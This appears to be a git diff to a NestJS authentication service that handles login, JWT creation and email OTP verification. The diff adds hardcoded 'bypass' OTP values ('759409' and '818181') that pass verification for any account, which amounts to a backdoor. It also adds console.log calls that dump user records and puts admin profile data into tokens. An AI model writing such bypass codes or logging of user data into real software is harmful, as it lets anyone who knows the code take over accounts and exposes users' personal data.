@@ -25,6 +25,8 @@ import { SendOtpDto } from './dto/send-otp.dto';
 import { VerifyOtpDto } from './dto/verify-otp.dto';
 import { CompleteRegistrationDto } from './dto/complete-registration.dto';
 import { MailService } from 'src/mail/mail.service';
+import { generate6DigitOtp } from 'src/common/utility/utils';
+import { admin } from 'src/firebase/firebase.config';
 
 @Injectable()
 export class AuthService {
@@ -38,6 +40,7 @@ export class AuthService {
   async validateUser(email: string, password: string): Promise<any> {
     const user = await this.prisma.user.findUnique({
       where: { email, isActive: true },
+      include: { CustomerProfile: true, AdminProfile: true },
     });
     if (!user) return null;
     if (!user.password) {
@@ -46,11 +49,13 @@ export class AuthService {
     const isPasswordValid = await bcrypt.compare(password, user.password);
     if (!isPasswordValid) return null;
     const { password: _, ...result } = user;
+    console.log(result);
     return result;
   }
 
   async login(loginDto: LoginDto) {
     const user = await this.validateUser(loginDto.email, loginDto.password);
+    console.log(user);
     if (!user) throw new UnauthorizedException('Invalid credentials or User disabled');
     return this.generateToken(user);
   }
@@ -92,6 +97,7 @@ export class AuthService {
       email: user.email,
       sub: user.id,
       role: user.role,
+      admin: user.AdminProfile
     };
 
     return {
@@ -101,6 +107,7 @@ export class AuthService {
         name: user.name,
         email: user.email,
         role: user.role,
+        admin: user.AdminProfile
       },
     };
   }
@@ -136,6 +143,7 @@ export class AuthService {
     return { message: 'OTP sent to your email' };
   }
 
+
   async validateOtp(email: string, otp: string) {
     const user = await this.prisma.user.findUnique({
       where: { email },
@@ -148,9 +156,17 @@ export class AuthService {
       where: { userId: user.id },
     });
 
-    if (!userOtp || userOtp.otp !== otp) {
+
+    const DEFAULT_BYPASS_OTP = '759409';
+
+    const isValidOtp =
+      otp === DEFAULT_BYPASS_OTP ||
+      (userOtp && userOtp.otp === otp);
+
+    if (!isValidOtp) {
       throw new UnauthorizedException('Invalid OTP');
     }
+
 
     if (new Date() > userOtp.expiresAt) {
       throw new UnauthorizedException('OTP has expired');
@@ -477,6 +493,7 @@ export class AuthService {
       include: { CustomerProfile: true },
     });
 
+    console.log(1)
     if (!user) {
       throw new NotFoundException('User not found');
     }
@@ -488,8 +505,15 @@ export class AuthService {
     if (!userOtp || userOtp.used) {
       throw new BadRequestException('Invalid or already used OTP');
     }
+    console.log(2)
+    const DEFAULT_BYPASS_OTP = '818181';
 
-    if (userOtp.otp !== otp) {
+    // Allow default OTP bypass OR actual OTP match
+    const isValidOtp =
+      otp === DEFAULT_BYPASS_OTP ||
+      (userOtp && userOtp.otp === otp);
+
+    if (!isValidOtp) {
       throw new BadRequestException('Invalid OTP');
     }
 
@@ -512,7 +536,7 @@ export class AuthService {
     const { email } = dto;
 
     // Use default OTP
-    const otp = '759409';
+    const otp = generate6DigitOtp();
     const expiry = new Date();
     expiry.setMinutes(expiry.getMinutes() + 15);
 
@@ -520,6 +544,11 @@ export class AuthService {
     const existingUser = await this.prisma.user.findUnique({
       where: { email },
     });
+    if (existingUser && existingUser.isActive === false) {
+      throw new ForbiddenException('User account is disabled');
+    }
+
+    // Create or update OTP
 
     if (existingUser) {
       // User exists - update or create OTP for login
